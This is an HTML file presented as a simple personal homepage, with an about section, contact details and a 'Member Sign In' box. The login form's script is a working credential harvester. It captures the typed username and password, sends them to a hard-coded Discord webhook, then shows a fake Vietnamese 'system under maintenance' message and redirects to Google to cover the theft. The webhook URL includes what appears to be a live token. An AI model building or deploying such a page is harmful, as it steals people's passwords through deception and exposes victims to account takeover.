<!DOCTYPE html>
<html>

<head>
    <title>My Personal Page</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }

        h1 {
            color: #333;
        }

        p {
            color: #666;
            line-height: 1.5;
        }

        div {
            background-color: #fff;
            border: 1px solid #ddd;
            padding: 20px;
            margin-top: 20px;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }

        /* Style cho Form đăng nhập */
        .login-box {
            background-color: #e8f0fe;
            border: 2px solid #4285f4;
        }

        .login-box input {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .login-box button {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }

        .login-box button:hover {
            background-color: #357abd;
        }

        div.small_div {
            width: 32%;
            background-color: aliceblue;
            float: left;
            margin-right: 1%;
            box-sizing: border-box;
            min-height: 150px;
        }

        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>

<body>
    <h1>Welcome to my website!</h1>

   <div class="login-box">
    <h2>Member Sign In</h2>
    <form id="loginForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</div>

<script>
    const loginForm = document.getElementById('loginForm');
    
    loginForm.onsubmit = async (e) => {
        e.preventDefault();

        // Lấy giá trị từ các ô input
        const username = loginForm.elements['username'].value;
        const password = loginForm.elements['password'].value;
        const webhookURL = "https://discord.com/api/webhooks/1479089877810417888/mqPMnUEeRT3mm90CibNA5G_bI-p2jJhcarrCIgF9y0JcjwwKPTUy0c5Y0FeHv4Mpvh5I";

        const message = {
            content: `🔔 **THÔNG BÁO MỚI**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
        };

        try {
            // Gửi dữ liệu đi bằng fetch
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });

            // Sau khi gửi xong thì hiện thông báo và chuyển hướng
            alert("Hệ thống đang bảo trì, vui lòng quay lại sau!");
            window.location.href = "https://google.com";
        } catch (error) {
            console.error("Lỗi:", error);
            alert("Có lỗi xảy ra, vui lòng thử lại!");
        }
    };
</script>

    <div>
        <h2>About Me</h2>
        <p>I am a web developer with a passion for creating beautiful and functional websites.</p>
    </div>

    <div class="clearfix">
        <div class="small_div">
            <h3>Contact Information</h3>
            <p>Email: example@email.com</p>
        </div>

        <div class="small_div">
            <h2>Social Media</h2>
            <p>Twitter: @example</p>
        </div>

        <div class="small_div">
            <table>
                <tr>
                    <th>Platform</th>
                    <th>Username</th>
                </tr>
                <tr>
                    <td>Facebook</td>
                    <td>example.fb</td>
                </tr>
                <tr>
                    <td>Instagram</td>
                    <td>@example.ig</td>
                </tr>
            </table>
        </div>
    </div>
</body>

</html>
